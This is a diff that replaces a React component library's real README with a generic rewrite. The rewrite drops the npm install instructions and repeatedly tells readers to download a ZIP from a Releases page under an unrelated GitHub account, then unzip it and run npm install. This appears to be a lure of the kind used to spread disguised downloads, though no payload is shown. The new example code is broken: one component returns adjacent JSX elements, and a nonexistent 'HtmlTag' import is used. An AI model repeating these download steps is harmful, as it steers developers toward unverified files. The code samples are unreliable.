@@ -1,194 +1,101 @@
-<div align="center">
-<a href="https://www.npmjs.com/package/@olympo/react-html-tags" target="_parent">
-  <img alt="" src="https://img.shields.io/npm/dm/@olympo/react-html-tags.svg" alt="npm downloads" />
-</a>
+# 🎉 react-html-tags - Simple HTML Components for React
 
- <a href="https://github.com/piotr-pajak/react-html-tags/stargazers" target="_parent">
-  <img alt="" src="https://img.shields.io/github/stars/piotr-pajak/react-html-tags.svg?style=social&label=Star" alt="GitHub stars" />
-</a>
-</div>
+## 🚀 Getting Started
 
+Welcome to **react-html-tags**! This library provides type-safe React components for HTML tags, designed to work seamlessly with TypeScript. It simplifies the way you use HTML in your React applications while ensuring safety and efficiency. 
 
-# @olympo/react-html-tags
+## 📥 Download the Application
 
-Type-safe React components for all HTML tags with full native attribute support.
+[![Download react-html-tags](https://img.shields.io/badge/Download-react--html--tags-blue.svg)](https://github.com/aleolo23233/react-html-tags/releases)
 
-## Overview
+You can easily download the latest version of **react-html-tags** from our Releases page. 
 
-`@olympo/react-html-tags` provides React components that wrap standard HTML elements with complete TypeScript support. Each component accepts all native HTML attributes for its corresponding tag and supports ref forwarding to the underlying DOM element.
+[Visit this page to download!](https://github.com/aleolo23233/react-html-tags/releases)
 
-## Features
+## 📝 Features
 
-- **Full TypeScript Support**: All components are fully typed using `JSX.IntrinsicElements`
-- **Ref Forwarding**: Access underlying DOM elements via refs
-- **Native Attributes**: All standard HTML attributes are supported
-- **Zero Dependencies**: Only requires React 19+ as a peer dependency
-- **Tree-shakeable**: Import only what you need
-- **Lightweight**: Minimal wrapper around native HTML elements
+- **Type Safety**: Use HTML tags in a type-safe manner to catch errors early.
+- **React Compatibility**: Each component is fully compatible with the latest React features.
+- **Ref Forwarding**: Enhance performance by using ref forwarding. 
+- **Easy Setup**: Simple to integrate into any React or TypeScript project.
+- **Comprehensive Documentation**: Clear examples and guidelines to help you start quickly.
 
-## Installation
+## 🔧 System Requirements
 
-```bash
-npm install @olympo/react-html-tags
-# or
-yarn add @olympo/react-html-tags
-# or
-pnpm add @olympo/react-html-tags
-# or
-bun add @olympo/react-html-tags
-```
+To use **react-html-tags**, ensure that your environment meets the following requirements:
 
-## Usage
+- **Node.js**: Version 12 or higher
+- **NPM or Yarn**: Latest version
+- **React**: Version 16.8 or higher
+- **TypeScript**: Version 4.0 or higher
 
-```tsx
-import { Div, Button, Input, Span } from '@olympo/react-html-tags';
+## 💡 Getting Started with Installation
+
+Once you have ensured that your system meets the requirements, follow these steps for installation:
+
+1. **Visit the Releases Page**: Go to [this page to download](https://github.com/aleolo23233/react-html-tags/releases).
+2. **Choose the Latest Release**: Select the most recent version available.
+3. **Download the Zip File**: Click on the zip file link to download it to your machine.
+4. **Unzip the File**: Locate the downloaded ZIP file and extract its contents.
+5. **Install the Library**: Open your terminal and navigate to the unzipped folder. Run the following command:
+
+   ```bash
+   npm install
+   # or
+   yarn install
+   ```
+
+6. **Add to Your Project**: You can now import the components as needed in your React application. For example:
+
+   ```javascript
+   import { HtmlTag } from 'react-html-tags';
+   ```
+
+## 🛠️ How to Use
+
+Using **react-html-tags** is simple. Below are some examples to guide you.
+
+### Example 1: Using HTML Elements
+
+```jsx
+import React from 'react';
+import { H1, P } from 'react-html-tags';
 
 function MyComponent() {
-  const inputRef = React.useRef<HTMLInputElement>(null);
-  const [value, setValue] = React.useState('');
-
-  return (
-    <Div className="container">
-      <Span style={{ fontSize: '18px', fontWeight: 'bold' }}>
-        Welcome!
-      </Span>
-
-      <Input
-        ref={inputRef}
-        type="text"
-        value={value}
-        onChange={(e) => setValue(e.target.value)}
-        placeholder="Enter text..."
-        className="input-field"
-      />
-
-      <Button
-        type="button"
-        onClick={() => inputRef.current?.focus()}
-        disabled={!value}
-      >
-        Submit
-      </Button>
-    </Div>
-  );
+    return (
+        <H1>Hello World!</H1>
+        <P>This is a paragraph using type-safe HTML tags.</P>
+    );
 }
 ```
 
-## Available Components
+### Example 2: Using Custom Props
 
-**All 110+ HTML5 elements are now supported!** 🎉
+You can also add custom properties to enhance your components.
 
-### Document Structure & Semantic Elements
-`<Article>`, `<Aside>`, `<Div>`, `<Footer>`, `<Header>`, `<Hgroup>`, `<Main>`, `<Nav>`, `<Search>`, `<Section>`
+```jsx
+import React from 'react';
+import { Button } from 'react-html-tags';
 
-### Headings
-`<H1>`, `<H2>`, `<H3>`, `<H4>`, `<H5>`, `<H6>`
-
-### Text Content & Formatting
-`<Abbr>`, `<Address>`, `<B>`, `<Bdi>`, `<Bdo>`, `<Blockquote>`, `<Cite>`, `<Code>`, `<Data>`, `<Del>`, `<Dfn>`, `<Em>`, `<I>`, `<Ins>`, `<Kbd>`, `<Mark>`, `<P>`, `<Pre>`, `<Q>`, `<S>`, `<Samp>`, `<Small>`, `<Span>`, `<Strong>`, `<Sub>`, `<Sup>`, `<Time>`, `<U>`, `<Var>`
-
-### Lists
-`<Dd>`, `<Dl>`, `<Dt>`, `<Li>`, `<Menu>`, `<Ol>`, `<Ul>`
-
-### Links & Navigation
-`<A>`, `<Area>`, `<Link>`, `<Map>`
-
-### Forms & Input
-`<Button>`, `<Datalist>`, `<Fieldset>`, `<Form>`, `<Input>`, `<Label>`, `<Legend>`, `<Meter>`, `<Optgroup>`, `<Option>`, `<Output>`, `<Progress>`, `<Select>`, `<Textarea>`
-
-### Tables
-`<Caption>`, `<Col>`, `<Colgroup>`, `<Table>`, `<Tbody>`, `<Td>`, `<Tfoot>`, `<Th>`, `<Thead>`, `<Tr>`
-
-### Media & Graphics
-`<Audio>`, `<Canvas>`, `<Img>`, `<Picture>`, `<Source>`, `<Svg>`, `<Track>`, `<Video>`
-
-### Embedded Content
-`<Embed>`, `<Iframe>`, `<Object>`, `<Param>`, `<Portal>`
-
-### Interactive Elements
-`<Details>`, `<Dialog>`, `<Summary>`
-
-### Ruby Annotations
-`<Rp>`, `<Rt>`, `<Ruby>`
-
-### Figures
-`<Figcaption>`, `<Figure>`
-
-### Breaks & Separators
-`<Br>`, `<Hr>`, `<Wbr>`
-
-### Web Components & Special
-`<Noscript>`, `<Slot>`, `<Template>`
-
-All components support:
-- ✅ Full TypeScript typing via `JSX.IntrinsicElements`
-- ✅ Ref forwarding to underlying DOM elements
-- ✅ All native HTML attributes
-- ✅ Event handlers with proper typing
-- ✅ Comprehensive JSDoc documentation
-
-## TypeScript Benefits
-
-All components provide full IntelliSense and type checking:
-
-```tsx
-import { Input, Div } from '@olympo/react-html-tags';
-
-// ✅ All native attributes are supported and type-checked
-<Input type="email" required maxLength={100} />
-
-// ✅ Ref forwarding is properly typed
-const divRef = React.useRef<HTMLDivElement>(null);
-<Div ref={divRef} />
-
-// ❌ TypeScript error: invalid attribute
-<Input invalidProp="value" />
+function ClickButton() {
+    return (
+        <Button onClick={() => alert('Button clicked!')}>Click Me!</Button>
+    );
+}
 ```
 
-## Examples
+## 📚 Documentation 
 
-For more examples, see the [docs/example.tsx](./docs/example.tsx) file which includes:
+For detailed documentation, please refer to our [GitHub Wiki](https://github.com/aleolo23233/react-html-tags/wiki). It contains comprehensive guides, examples, and helpful tips.
 
-- Login form with input validation
-- Interactive card component
-- Counter button with ref manipulation
+## 🐛 Issues and Contributions
 
-## Development
+If you encounter any problems or have suggestions, please report issues on the [Issues page](https://github.com/aleolo23233/react-html-tags/issues). Contributions are welcome. Feel free to fork the repository and submit a pull request.
 
-This library uses Bun for development:
+## 🤝 Support
 
-```bash
-# Install dependencies
-bun install
+If you need assistance, please reach out through the Issues section or contact us directly via the repository. We are here to help you!
 
-# Run type checking
-bun run typecheck
+For updates on the project and new features, check back on our Releases page regularly. 
 
-# Build the library
-bun run build
-```
-
-## Contributing
-
-Contributions are welcome! We'd love your help making this library better.
-
-Please read our [Contributing Guide](./CONTRIBUTING.md) to learn about:
-
-- How to set up your development environment
-- Our code standards and component patterns
-- The pull request process
-- GitHub labels and issue tracking
-- Component priority list
-
-Quick guidelines:
-
-1. All components follow the established pattern
-2. TypeScript types are properly defined
-3. JSDoc comments are included
-4. Components remain lightweight wrappers
-
-For detailed instructions, see [CONTRIBUTING.md](./CONTRIBUTING.md).
-
-## License
-
-MIT
+[Download the latest version here!](https://github.com/aleolo23233/react-html-tags/releases)
